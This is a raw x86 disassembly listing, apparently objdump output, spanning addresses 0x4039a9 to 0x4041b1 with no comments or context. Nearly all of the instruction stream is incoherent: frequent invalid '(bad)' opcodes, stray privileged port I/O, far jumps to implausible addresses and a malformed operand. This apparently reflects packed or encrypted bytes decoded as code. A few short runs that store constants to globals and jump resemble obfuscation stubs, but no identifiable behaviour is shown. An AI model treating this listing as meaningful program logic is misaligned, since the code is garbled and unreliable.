  4039a9:	or     al,0x87
  4039ab:	sbb    al,0xa1
  4039ad:	mov    ah,0x75
  4039af:	in     eax,dx
  4039b0:	mov    ?,WORD PTR [edx]
  4039b2:	pop    esp
  4039b3:	xchg   esi,eax
  4039b4:	jl     0x4039a6
  4039b6:	cmp    al,0x86
  4039b8:	(bad)  
  4039b9:	out    dx,eax
  4039ba:	jae    0xc7d8227c
  4039c0:	add    eax,ecx
  4039c2:	mov    bl,0x6d
  4039c4:	adc    bl,dh
  4039c6:	mov    al,0x43
  4039c8:	mov    BYTE PTR [ecx+0xac1ce52],al
  4039ce:	arpl   WORD PTR [esi+0x20],ax
  4039d1:	inc    edi
  4039d2:	jb     0x403992
  4039d4:	outs   dx,DWORD PTR ds:[esi]
  4039d5:	jno    0x403a47
  4039d7:	ss adc al,0x83
  4039da:	int    0xc
  4039dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039dd:	js     0x40396a
  4039df:	pop    ecx
  4039e1:	retf   0x8bd1
  4039e4:	xor    eax,0x722e49bb
  4039e9:	push   ds
  4039ea:	pop    ss
  4039eb:	dec    ebx
  4039ec:	call   0x73ef93de
  4039f1:	push   ecx
  4039f2:	push   edx
  4039f3:	call   0x4788ec1b
  4039f8:	sbb    BYTE PTR [ecx+0x40],dl
  4039fb:	push   eax
  4039fc:	and    al,al
  4039fe:	push   ebp
  4039ff:	imul   esi,DWORD PTR ds:0x3f47b547,0x92486465
  403a09:	retf   0xf34a
  403a0c:	dec    ebx
  403a0d:	(bad)  
  403a0e:	outs   dx,BYTE PTR ds:[esi]
  403a0f:	or     ebx,DWORD PTR [ebp+0x5b]
  403a12:	scas   eax,DWORD PTR es:[edi]
  403a13:	lods   al,BYTE PTR ds:[esi]
  403a14:	adc    edi,DWORD PTR cs:[esi+0x3b99507c]
  403a1b:	jbe    0x4039ea
  403a1d:	data16 (bad) 
  403a1f:	movnti DWORD PTR [esi+0x41116c7d],edx
  403a26:	mov    edi,0x48b6a488
  403a2b:	scas   al,BYTE PTR es:[edi]
  403a2c:	addr16 add cl,dh
  403a2f:	inc    edx
  403a30:	outs   dx,BYTE PTR ds:[esi]
  403a31:	leave  
  403a32:	pop    eax
  403a33:	in     eax,dx
  403a34:	add    DWORD PTR [edi+0x6e304dc8],ebp
  403a3a:	cmp    al,0x9f
  403a3c:	outs   dx,DWORD PTR ds:[esi]
  403a3d:	lods   al,BYTE PTR ds:[esi]
  403a3e:	arpl   WORD PTR [esi+edx*4+0x8],di
  403a42:	xchg   edi,eax
  403a43:	int3   
  403a44:	sub    eax,DWORD PTR [eax]
  403a46:	aas    
  403a47:	inc    esp
  403a48:	clc    
  403a49:	add    esi,ebp
  403a4b:	inc    ebp
  403a4c:	push   eax
  403a4d:	xor    BYTE PTR [esp+ecx*4],bh
  403a50:	rol    DWORD PTR [edx+0x79],1
  403a53:	push   es
  403a54:	es test ebp,esp
  403a57:	out    dx,eax
  403a58:	add    edi,eax
  403a5a:	and    dh,BYTE PTR [edx-0x2814e2a3]
  403a60:	sub    DWORD PTR [ecx+0x3a],ebp
  403a63:	outs   dx,BYTE PTR ds:[esi]
  403a64:	fisub  WORD PTR [edx+edx*2+0xde96320]
  403a6b:	rcl    BYTE PTR ds:0xa6e43ed9,1
  403a71:	sub    DWORD PTR [ebp+eiz*4-0x7c38658],esp
  403a78:	mov    ebx,0x4a6c413e
  403a7d:	mov    WORD PTR [eax+0x58],gs
  403a80:	aad    0x52
  403a82:	daa    
  403a83:	add    ebp,esi
  403a85:	dec    ebx
  403a86:	mov    esp,0x4dd930b4
  403a8b:	jo     0x403aa7
  403a8d:	push   eax
  403a8e:	aam    0xba
  403a90:	sbb    dh,al
  403a92:	xor    ah,dh
  403a94:	cmp    eax,0x927cd81d
  403a99:	hlt    
  403a9a:	shl    edx,cl
  403a9c:	push   edx
  403a9d:	cmc    
  403a9e:	add    ah,BYTE PTR [edx]
  403aa0:	push   edx
  403aa1:	pusha  
  403aa2:	mov    cl,ch
  403aa4:	jb     0x403a50
  403aa6:	jbe    0x403b0e
  403aa8:	(bad)  
  403aa9:	dec    eax
  403aaa:	mov    esp,0xe4ff3345
  403aaf:	pop    eax
  403ab0:	jge    0x403a4f
  403ab2:	repz push cs
  403ab4:	aam    0xdb
  403ab6:	retf   
  403ab7:	sbb    al,0x93
  403ab9:	(bad)  
  403aba:	popf   
  403abb:	(bad)  
  403abd:	inc    esp
  403abe:	gs pop edi
  403ac0:	pushf  
  403ac1:	arpl   WORD PTR [ecx],bx
  403ac3:	mov    eax,ds:0x1be66455
  403ac8:	adc    edi,DWORD PTR [eax+0x73e4d6b5]
  403ace:	add    BYTE PTR [ebp+ecx*2-0x8],dh
  403ad2:	sub    BYTE PTR [eax],bh
  403ad4:	popa   
  403ad5:	xchg   edi,eax
  403ad6:	cmp    esi,DWORD PTR [esi-0x4589257b]
  403adc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403add:	repnz fistp DWORD PTR [ebp-0xbee6e8c]
  403ae4:	fucom  st(4)
  403ae6:	mov    dl,0xab
  403ae8:	xchg   ecx,eax
  403ae9:	rcr    BYTE PTR [ebx],0x71
  403aec:	sbb    edi,DWORD PTR [esi]
  403aee:	adc    edx,DWORD PTR [esi+0xfff458a]
  403af4:	mov    bh,0xd
  403af6:	jmp    0x403ade
  403af8:	inc    edx
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fd76
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x7ac61a97],esi
  403b3e:	(bad)
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x9370707d
  403b48:	or     al,0xd6
  403b4a:	pop    ecx
  403b4b:	push   ss
  403b4c:	push   esp
  403b4d:	mov    eax,ds:0xf1fd3ce2
  403b52:	sbb    DWORD PTR [ecx],0x7
  403b55:	pop    edi
  403b56:	fadd   DWORD PTR [ebp+0x4d]
  403b59:	mov    ebp,0xf3bde7ab
  403b5e:	test   DWORD PTR [ebx-0x9],0xbd8b08dd
  403b65:	mov    esi,0xde70d78f
  403b6a:	gs inc esp
  403b6c:	lea    eax,[ebx-0x5bad856e]
  403b72:	jns    0x403bb8
  403b74:	or     DWORD PTR [ecx-0x7b],ebx
  403b77:	je     0x403b0e
  403b79:	das    
  403b7a:	dec    ebx
  403b7b:	jno    0x403b03
  403b7d:	inc    edx
  403b7e:	or     al,0xce
  403b80:	and    al,BYTE PTR [edx+0x7727ed02]
  403b86:	mov    dh,0x55
  403b88:	push   esi
  403b89:	cmc    
  403b8a:	or     DWORD PTR [edi+esi*2-0x22],esi
  403b8e:	pop    esi
  403b8f:	clc    
  403b90:	fistp  DWORD PTR [eax]
  403b92:	dec    esi
  403b93:	xor    al,0xc7
  403b95:	les    edx,FWORD PTR [ecx+0x56]
  403b98:	add    al,0xdc
  403b9a:	cmp    DWORD PTR [ecx+ecx*1-0x75d059b1],ebx
  403ba1:	or     edx,DWORD PTR [esp+ecx*8+0x30]
  403ba5:	test   DWORD PTR [ebp-0x7f],0xa7ec7a8c
  403bac:	lds    esi,FWORD PTR [ecx+eiz*1+0x4434faee]
  403bb3:	sub    ah,BYTE PTR [esi-0x1e6b3370]
  403bb9:	jge    0x403bc8
  403bbb:	mov    ds:0xb52bffd9,eax
  403bc0:	or     ch,bl
  403bc2:	clc    
  403bc3:	sub    al,0x63
  403bc5:	(bad)
  403bc9:	sbb    bl,ch
  403bcb:	es ret 
  403bcd:	xor    al,0xf5
  403bcf:	mov    esp,0xb5f79f74
  403bd4:	and    ecx,edi
  403bd6:	out    dx,eax
  403bd7:	rol    BYTE PTR [ebp+0x2844bfd8],cl
  403bdd:	(bad)  
  403bde:	and    esi,ebx
  403be0:	mov    esi,DWORD PTR [edi]
  403be2:	xor    BYTE PTR [ebx+0x59c27854],bl
  403be8:	fild   DWORD PTR [eax-0xa]
  403beb:	popf   
  403bec:	aas    
  403bed:	daa    
  403bee:	pop    ss
  403bef:	jl     0x403b79
  403bf1:	jmp    0x7be5ce93
  403bf6:	stos   DWORD PTR es:[edi],eax
  403bf7:	imul   esp,esi,0x2a
  403bfa:	pusha  
  403bfb:	idiv   BYTE PTR [eax]
  403bfd:	push   ebx
  403bfe:	add    ch,al
  403c00:	sub    BYTE PTR [ebx+0x15021508],al
  403c06:	jbe    0x403be8
  403c08:	lahf   
  403c09:	add    DWORD PTR [ebx+0x76b21949],edx
  403c0f:	and    esi,edx
  403c11:	or     ch,BYTE PTR [eax-0x28]
  403c14:	test   al,0x18
  403c16:	mov    cl,0x95
  403c18:	int3   
  403c19:	int    0xdb
  403c1b:	xchg   edi,eax
  403c1c:	pop    esi
  403c1d:	jne    0x403bf5
  403c1f:	lock xchg esp,eax
  403c21:	pusha  
  403c22:	mov    bh,0xc
  403c24:	xor    DWORD PTR [edx+0x3627e95f],ecx
  403c2a:	push   edi
  403c2b:	mov    bh,0x83
  403c2d:	adc    eax,0xecdabb3b
  403c32:	dec    BYTE PTR [ebp+0x2fe7ad9]
  403c38:	or     al,BYTE PTR cs:[edx+0x38]
  403c3c:	retf   
  403c3d:	push   edx
  403c3e:	and    ecx,DWORD PTR [edx]
  403c40:	push   ebx
  403c41:	imul   edx,DWORD PTR [esp+eax*8+0x3df9d808],0x33
  403c49:	xchg   ecx,eax
  403c4a:	jmp    0x8217:0xf868f9b9
  403c51:	daa    
  403c52:	(bad)  
  403c53:	aas    
  403c54:	(bad)  
  403c55:	scas   al,BYTE PTR es:[edi]
  403c56:	adc    esi,DWORD PTR [edi+ecx*4+0x3ea2a0be]
  403c5d:	pushf  
  403c5e:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c60:	div    BYTE PTR [esi]
  403c62:	daa    
  403c63:	ss pop ds
  403c65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c66:	jno    0x403c24
  403c68:	out    0xd1,al
  403c6a:	xchg   edx,eax
  403c6b:	xor    al,0x2c
  403c6d:	push   ss
  403c6e:	inc    ebp
  403c6f:	gs ret 
  403c71:	sbb    DWORD PTR [ecx+0x64],esp
  403c74:	std    
  403c75:	xchg   edi,eax
  403c76:	std    
  403c77:	jg     0x403c0f
  403c79:	test   eax,0xf487c700
  403c7e:	pop    edi
  403c7f:	jl     0x403c0a
  403c81:	cld    
  403c82:	int    0xf8
  403c84:	stos   DWORD PTR es:[edi],eax
  403c85:	mov    cl,0xfa
  403c87:	cmp    BYTE PTR [ecx+0x72c44e34],0x4c
  403c8e:	test   DWORD PTR [edx+ebx*1],ebx
  403c91:	fisubr DWORD PTR [ecx]
  403c93:	in     eax,0xb3
  403c95:	or     DWORD PTR [eax],ebp
  403c97:	pusha  
  403c98:	or     BYTE PTR [ebx-0x74],dl
  403c9b:	mov    cl,0xf0
  403c9d:	lahf   
  403c9e:	cmp    dh,BYTE PTR [ebx+0x46]
  403ca1:	data16 mov ds:0x92f05f61,al
  403ca7:	mov    ebx,0x7227e9ce
  403cac:	xchg   esi,eax
  403cad:	in     eax,0xaa
  403caf:	mov    BYTE PTR [ebx+0x1072f8c5],bl
  403cb5:	addr16 and al,0x74
  403cb8:	data16 int 0x9e
  403cbb:	and    BYTE PTR [esi],al
  403cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cbe:	outs   dx,BYTE PTR ds:[esi]
  403cbf:	shl    BYTE PTR [ebp-0xf4d2144],0x9c
  403cc6:	sti    
  403cc7:	dec    ebp
  403cc8:	sub    BYTE PTR [eax-0x17b0d312],dl
  403cce:	xor    BYTE PTR [ebx+0x54],0x1e
  403cd2:	popf   
  403cd3:	or     dh,ah
  403cd5:	cmp    eax,0x1affe1c6
  403cda:	cli    
  403cdb:	in     al,0x3c
  403cdd:	sub    esi,DWORD PTR [ecx]
  403cdf:	pop    ds
  403ce0:	cmp    bh,BYTE PTR [edi-0x54f738ad]
  403ce6:	cmc    
  403ce7:	jle    0x403ce2
  403ce9:	mov    edx,ds
  403ceb:	jns    0x403d0c
  403ced:	xor    esp,edx
  403cef:	scas   eax,DWORD PTR es:[edi]
  403cf0:	xlat   BYTE PTR ds:[ebx]
  403cf1:	mov    ebp,0x655a16f7
  403cf6:	lock or al,0xb5
  403cf9:	mov    ch,0x10
  403cfb:	xchg   edx,eax
  403cfc:	bound  ebx,QWORD PTR [ecx]
  403cfe:	xor    eax,0xc15c3d4
  403d03:	or     bh,al
  403d05:	adc    eax,0x85719368
  403d0a:	push   esp
  403d0b:	sub    BYTE PTR [eax+0x6f2bd306],ch
  403d11:	jo     0x403d1f
  403d13:	retf   0x48c1
  403d16:	add    al,cl
  403d18:	push   ecx
  403d19:	push   ebx
  403d1a:	ja     0x403d02
  403d1c:	cld    
  403d1d:	adc    DWORD PTR [ebx+ebp*8],0xffffffb9
  403d21:	ss jmp 0x6131f1d7
  403d27:	dec    esi
  403d28:	and    eax,0x3c5ac425
  403d2d:	mov    dl,BYTE PTR [edx]
  403d2f:	out    dx,al
  403d30:	mov    eax,0x751cce0c
  403d35:	mov    BYTE PTR [ebp+0x12],bl
  403d38:	ret    
  403d39:	jp     0x403da4
  403d3b:	inc    edi
  403d3c:	dec    edi
  403d3d:	add    DWORD PTR ds:0x235c,edx
  403d42:	xor    BYTE PTR [eax+0x53],dl
  403d45:	jmp    0xc776:0x8aea1037
  403d4c:	inc    edx
  403d4d:	outs   dx,BYTE PTR ds:[esi]
  403d4e:	dec    edi
  403d4f:	jle    0x403d87
  403d51:	scas   eax,DWORD PTR es:[edi]
  403d52:	out    dx,eax
  403d53:	push   esi
  403d54:	xor    eax,ebp
  403d56:	(bad)  
  403d57:	popf   
  403d58:	jns    0x403d6f
  403d5a:	mov    edi,0xa77c3083
  403d5f:	lds    esp,FWORD PTR [ebx-0x7a05d9cc]
  403d65:	mov    al,0x62
  403d67:	xor    al,BYTE PTR [eax-0x3c]
  403d6a:	test   edx,edx
  403d6c:	out    dx,al
  403d6d:	stc    
  403d6e:	sub    al,0xb6
  403d70:	add    al,BYTE PTR [ebx+edx*4-0xfbe9d48]
  403d77:	sbb    al,0x28
  403d79:	mov    edi,0x9e5d5b3b
  403d7e:	out    dx,eax
  403d7f:	dec    ecx
  403d80:	js     0x403d6c
  403d82:	int    0xc0
  403d84:	push   ss
  403d85:	(bad)  
  403d86:	xor    eax,0x47ea1081
  403d8b:	je     0x403de3
  403d8d:	or     eax,0xb54e404f
  403d92:	or     BYTE PTR [ebx+0x5c],dl
  403d95:	cwde   
  403d96:	xor    edi,ecx
  403d98:	push   esi
  403d99:	mov    dh,BYTE PTR [ecx-0x29]
  403d9c:	xlat   BYTE PTR ds:[ebx]
  403d9d:	imul   DWORD PTR [ecx+0x56]
  403da0:	adc    eax,0x58d7dc5e
  403da5:	push   0xffffffb4
  403da7:	push   ss
  403da8:	adc    DWORD PTR [ebp-0x13964f63],0x5
  403daf:	pop    esi
  403db0:	adc    DWORD PTR [ecx],edi
  403db2:	(bad)  
  403db3:	(bad)  
  403db4:	out    0x1e,al
  403db6:	in     al,dx
  403db7:	cmp    edx,0x73
  403dba:	and    BYTE PTR [eax+eax*1+0x1b],cl
  403dbe:	test   edx,eax
  403dc0:	mov    cl,0x7
  403dc2:	xor    DWORD PTR [edi+edx*1],edi
  403dc5:	inc    eax
  403dc6:	adc    ecx,DWORD PTR [edi]
  403dc8:	push   edi
  403dc9:	xor    edi,DWORD PTR [esi]
  403dcb:	sti    
  403dcc:	lahf   
  403dcd:	adc    esi,DWORD PTR [eax-0x67]
  403dd0:	imul   eax,DWORD PTR [esi+0xd0d00d],0xffffffbc
  403dd7:	repnz outs dx,BYTE PTR ds:[esi]
  403dda:	cmp    BYTE PTR [ebp+0x1f],al
  403ddd:	mov    esp,0xeb56250
  403de2:	jmp    0x49bf43c5
  403de7:	add    cl,bl
  403de9:	add    ecx,ebx
  403deb:	jb     0x403df8
  403ded:	(bad)  
  403dee:	jle    0x403dae
  403df0:	lods   eax,DWORD PTR ds:[esi]
  403df1:	(bad)  
  403df2:	retf   
  403df3:	mov    cl,0x5e
  403df5:	inc    ebx
  403df6:	fs pop ds
  403df8:	pushf  
  403df9:	ja     0x403db9
  403dfb:	jbe    0x403e37
  403dfd:	mov    ch,0xbc
  403dff:	int3   
  403e00:	xchg   edi,eax
  403e01:	inc    esp
  403e02:	sahf   
  403e03:	xor    al,0x2d
  403e05:	xchg   esi,eax
  403e06:	adc    BYTE PTR [esi+edi*2],bh
  403e09:	dec    esp
  403e0a:	push   ds
  403e0b:	add    ch,BYTE PTR [eax+0x44ec50bd]
  403e11:	das    
  403e12:	fist   WORD PTR [esi+0x47a71734]
  403e18:	cmp    bh,BYTE PTR [ecx]
  403e1a:	sahf   
  403e1b:	leave  
  403e1c:	(bad)  
  403e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e1e:	dec    ebx
  403e1f:	mov    dh,0xf3
  403e21:	mov    ebx,0xbc858df1
  403e26:	sub    eax,0x2c13807a
  403e2b:	mov    edx,0x11ef63ff
  403e30:	jl     0x403de2
  403e32:	aad    0x16
  403e34:	fdiv   QWORD PTR [ebx]
  403e36:	mov    dl,0x40
  403e38:	mov    BYTE PTR [ecx+0x34],dh
  403e3b:	pop    esp
  403e3c:	and    BYTE PTR [esp+ebp*8],dh
  403e3f:	mov    eax,ds:0x3843c5a8
  403e44:	ss fldenv ds:[ecx]
  403e48:	pop    es
  403e49:	jnp    0x403ea5
  403e4b:	adc    BYTE PTR [ebx+0x6fc3529d],ah
  403e51:	jg     0x403e5e
  403e53:	daa    
  403e54:	xchg   ebp,eax
  403e55:	dec    edi
  403e56:	iret   
  403e57:	cdq    
  403e58:	addr16 mov al,ds:0x7051
  403e5c:	sub    cl,BYTE PTR [edx-0x2d]
  403e5f:	push   ebx
  403e60:	mov    al,0x9a
  403e62:	and    bl,BYTE PTR [edx-0x18]
  403e65:	mov    al,ds:0x37ee76bf
  403e6a:	fsub   DWORD PTR [ebx+eax*2]
  403e6d:	cmp    bl,ah
  403e6f:	retf   
  403e70:	and    al,0xb
  403e72:	test   bh,cl
  403e74:	jg     0x403eb5
  403e76:	jns    0x403df9
  403e78:	fdiv   DWORD PTR [ecx-0x4a243fdb]
  403e7e:	mov    cs,WORD PTR [ebp+0x7a]
  403e81:	js     0x403e31
  403e83:	adc    eax,0x95975a93
  403e88:	add    BYTE PTR [esi+0x30f045c7],dl
  403e8e:	test   DWORD PTR [eax+edi*8-0x4607ba75],ebx
  403e95:	push   ebp
  403e96:	or     BYTE PTR [ecx+0x7],dl
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x99bb1c35
  403eec:	cmp    al,0xe2
  403eee:	sbb    BYTE PTR [ebx],0x70
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403e95
  403ef7:	sysenter 
  403ef9:	xchg   ebx,eax
  403efa:	addr16 inc esp
  403efc:	adc    eax,0x40812202
  403f01:	add    DWORD PTR [ebp+0x3eebab96],edi
  403f07:	je     0x403f71
  403f09:	xchg   ebp,eax
  403f0a:	add    bl,al
  403f0c:	jno    0x403f84
  403f0e:	ds test dl,bh
  403f11:	add    DWORD PTR [eax+0x6f565bb8],eax
  403f17:	ror    DWORD PTR [esi+eax*4+0x1a2ae2fe],cl
  403f1e:	mov    esi,0x339860ad
  403f23:	inc    esp
  403f24:	cmp    DWORD PTR [esi-0x61],esp
  403f27:	imul   esp,DWORD PTR [eax+0x6],0xe3b917e3
  403f2e:	imul   BYTE PTR [eax+0x79]
  403f31:	cs push edi
  403f33:	mov    dh,0xd5
  403f35:	add    bh,BYTE PTR [ebx+0x23f1b231]
  403f3b:	fld    TBYTE PTR [ecx+0x38]
  403f3e:	int    0xea
  403f40:	mov    eax,ds:0x6ea2d828
  403f45:	ficom  WORD PTR [ebx+0x4]
  403f48:	xchg   BYTE PTR [ebx-0x2e992059],bl
  403f4e:	cli    
  403f4f:	fsubr  DWORD PTR [esi+0x15]
  403f52:	jp     0x403f83
  403f54:	jecxz  0x403f31
  403f56:	mov    edi,0xe7ba2304
  403f5b:	cmp    al,dh
  403f5d:	adc    eax,0x717f1c5e
  403f62:	ins    BYTE PTR es:[edi],dx
  403f63:	loop   0x403f32
  403f65:	sbb    eax,0x5d81e42b
  403f6a:	ins    DWORD PTR es:[edi],dx
  403f6b:	out    dx,eax
  403f6c:	nop
  403f6d:	adc    dh,bh
  403f6f:	cmp    ah,BYTE PTR [ebx]
  403f71:	jno    0x403f2c
  403f73:	scas   eax,DWORD PTR es:[edi]
  403f74:	xchg   edx,eax
  403f75:	cmp    esi,DWORD PTR [eax+eax*4+0x42]
  403f79:	jmp    0x80b7f437
  403f7e:	add    ebx,edi
  403f80:	rol    DWORD PTR es:[ecx+0x21b5fbfe],cl
  403f87:	push   ss
  403f88:	repnz xor al,0xd1
  403f8b:	xchg   ebp,eax
  403f8c:	xchg   esp,eax
  403f8d:	push   esp
  403f8e:	or     ebp,ebp
  403f90:	loop   0x403fe0
  403f92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f93:	mov    bh,BYTE PTR [ecx+ebp*4-0x54]
  403f97:	mov    edx,0x8d2d9b89
  403f9c:	push   ecx
  403f9d:	push   ebp
  403f9e:	dec    eax
  403f9f:	pop    esp
  403fa0:	or     DWORD PTR es:[esi],eax
  403fa3:	test   DWORD PTR [eax+0x5133a1ec],ecx
  403fa9:	push   esi
  403faa:	mov    cl,0xae
  403fac:	xor    bl,BYTE PTR [esi+0x30]
  403faf:	mov    esi,0x5d19abf6
  403fb4:	jmp    0xb866b3bd
  403fb9:	xlat   BYTE PTR ds:[ebx]
  403fba:	push   eax
  403fbb:	pop    es
  403fbc:	pop    eax
  403fbd:	pop    DWORD PTR [ebp+0x28]
  403fc0:	jg     0x403fac
  403fc2:	jmp    0xc091:0xf22b190d
  403fc9:	jle    0x403fd4
  403fcb:	out    0x64,eax
  403fcd:	xor    bh,bh
  403fcf:	push   esp
  403fd0:	es pop eax
  403fd2:	nop
  403fd3:	mov    dl,BYTE PTR [edx+ecx*8-0x7c]
  403fd7:	sub    ecx,DWORD PTR [esi-0x44]
  403fda:	cwde   
  403fdb:	mov    ebp,0xfd862103
  403fe1:	imul   ebx,DWORD PTR [edx],0x10
  403fe4:	sub    bh,BYTE PTR [ebx-0x1ae4d161]
  403fea:	jge    0x403f9c
  403fec:	mov    esi,eax
  403fee:	sbb    esi,DWORD PTR [ebx+0x2a]
  403ff1:	mov    ebp,0xaf7b7d47
  403ff6:	or     eax,0x53e919d7
  403ffb:	fbld   TBYTE PTR [eax+0x46]
  403ffe:	aaa    
  403fff:	sub    bh,dh
  404001:	stos   DWORD PTR es:[edi],eax
  404002:	ds sbb eax,0xadd14796
  404008:	in     eax,0xc2
  40400a:	push   ebp
  40400b:	xor    bh,BYTE PTR [ebx-0x7f682ed0]
  404011:	xchg   DWORD PTR [edi+0x1e9e628f],ebp
  404017:	cmp    esi,0xd4758a07
  40401d:	fxch   st(5)
  40401f:	icebp  
  404020:	imul   esi,DWORD PTR [edx+0x4d10c56d],0x786514fd
  40402a:	xor    BYTE PTR [eax-0x70],ch
  40402d:	mov    ds:0x2bcaed38,al
  404032:	push   ds
  404033:	shr    edx,cl
  404035:	ds push esi
  404037:	inc    ebp
  404038:	mov    ecx,0x11fce0e6
  40403d:	inc    eax
  40403e:	cmp    BYTE PTR [edx],bh
  404040:	lahf   
  404041:	sbb    al,0x53
  404043:	dec    ebp
  404044:	and    al,bh
  404046:	or     edx,DWORD PTR [ecx+0x5b07f4c1]
  40404c:	imul   eax,DWORD PTR [ebx-0x309d7b84],0xffffffd3
  404053:	jnp    0x40407e
  404055:	fmul   QWORD PTR [edx-0x49]
  404058:	sti    
  404059:	jns    0x40403f
  40405b:	xor    DWORD PTR gs:[edi-0x2d2afad0],0x6c80932a
  404066:	mov    al,0xfa
  404068:	rcr    DWORD PTR [eax-0x69c4eb1d],0x44
  40406f:	dec    ebp
  404070:	sbb    ah,BYTE PTR [edi+0x70]
  404073:	in     al,0x21
  404075:	shl    BYTE PTR [esp+edi*1+0x48],0x6d
  40407a:	cmp    BYTE PTR [edi-0x48d483ae],0x5a
  404081:	scas   al,BYTE PTR es:[edi]
  404082:	and    DWORD PTR [eax+0x2f],esi
  404085:	sbb    al,0xcf
  404087:	cmp    ecx,ebx
  404089:	imul   edi,ebp,0x602afa8d
  40408f:	and    esp,esi
  404091:	cmp    al,0xe6
  404093:	mov    WORD PTR [eax+0x3706d7d4],ds
  404099:	test   eax,0x99e009de
  40409e:	in     eax,dx
  40409f:	pop    es
  4040a0:	stos   BYTE PTR es:[edi],al
  4040a1:	mov    dh,0x20
  4040a3:	out    dx,eax
  4040a4:	int    0xd4
  4040a6:	dec    esi
  4040a7:	jl     0x4040ce
  4040a9:	test   al,0x7
  4040ab:	enter  0x2df6,0x89
  4040af:	nop
  4040b0:	stos   DWORD PTR es:[edi],eax
  4040b1:	add    ebx,DWORD PTR [edi]
  4040b3:	xor    edi,DWORD PTR [ebx]
  4040b5:	pop    ebx
  4040b6:	in     eax,dx
  4040b7:	or     eax,0x4a8c83e7
  4040bc:	shl    cl,0x5d
  4040bf:	mov    esp,0x7b64ef92
  4040c4:	fcomp  QWORD PTR [eax+eiz*8-0x73]
  4040c8:	mov    ecx,0x18c77133
  4040cd:	mov    ecx,0xe512a755
  4040d2:	cmp    ebp,DWORD PTR [eax+esi*2+0x76c23591]
  4040d9:	mov    ebp,0xb9599924
  4040de:	inc    ebp
  4040df:	(bad)  
  4040e0:	push   cs
  4040e1:	retf   0xc921
  4040e4:	pop    esi
  4040e5:	dec    ecx
  4040e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040e7:	(bad)  
  4040e8:	repz cmp al,0x89
  4040eb:	rcl    BYTE PTR [ecx],1
  4040ed:	cmp    BYTE PTR [edx-0xc],bh
  4040f0:	out    0x21,al
  4040f2:	ret    0xe6d2
  4040f5:	pop    edi
  4040f6:	dec    esi
  4040f7:	fucomip st,st(5)
  4040f9:	in     eax,0xda
  4040fb:	mov    eax,0xcf1cd43a
  404100:	inc    eax
  404101:	xor    BYTE PTR [bp+0x46],ah
  404105:	je     0x404154
  404107:	pop    ecx
  404108:	rcr    DWORD PTR [ebx+ebx*1-0x7c],1
  40410c:	test   eax,0x6460449d
  404111:	aam    0xca
  404113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404114:	mov    WORD PTR [edi+0x79a1d82f],fs
  40411a:	pop    ebp
  40411b:	xor    BYTE PTR [ebx+ebp*8-0x18],ch
  40411f:	dec    edx
  404120:	adc    DWORD PTR [edi+0xda8f2ce],esp
  404126:	leave  
  404127:	xor    ebx,ecx
  404129:	sub    eax,0xec57b5d
  40412e:	iret   
  40412f:	push   eax
  404130:	pop    esi
  404131:	sbb    dh,BYTE PTR [edx+0x27018ab6]
  404137:	pop    edi
  404138:	(bad)  
  404139:	mov    ds:0xcbf3987e,al
  40413e:	jecxz  0x40414a
  404140:	mov    al,ds:0xe421804b
  404145:	cmp    DWORD PTR [edi+0x3],ebp
  404148:	test   BYTE PTR [ebp+0x20eca34f],bl
  40414e:	inc    eax
  40414f:	and    eax,0xd3885b5a
  404154:	in     eax,0x51
  404156:	and    eax,0x6c0c64c9
  40415b:	sbb    eax,0xf7a1df17
  404160:	ja     0x404169
  404162:	fyl2x  
  404164:	cmp    dl,BYTE PTR [esi]
  404166:	out    dx,al
  404167:	jnp    0x404134
  404169:	call   0x40063642
  40416e:	lods   al,BYTE PTR ds:[esi]
  40416f:	arpl   WORD PTR [edx],ax
  404171:	pop    edi
  404172:	add    DWORD PTR [esi-0x74],ecx
  404175:	and    ecx,esi
  404177:	adc    al,0x33
  404179:	mov    ebp,0xfc1ce413
  40417e:	test   eax,0x59b9f4b3
  404183:	pushf  
  404184:	inc    ebp
  404185:	iret   
  404186:	pop    ecx
  404187:	call   0x1e22:0x3d0ce722
  40418e:	iret   
  40418f:	push   ecx
  404190:	mov    al,ds:0x46a75bcf
  404195:	mov    ebx,0x3da1280c
  40419a:	fs (bad) 
  40419c:	inc    ecx
  40419d:	and    edi,edx
  40419f:	jg     0x4041a0
  4041a1:	sti    
  4041a2:	(bad)  
  4041a3:	aam    0x73
  4041a5:	or     BYTE PTR [edi+eiz*2-0x390f6341],0xae
  4041ad:	mov    BYTE PTR [edi],cl
  4041af:	add    cl,BYTE PTR [eax]
  4041b1:	icebp  
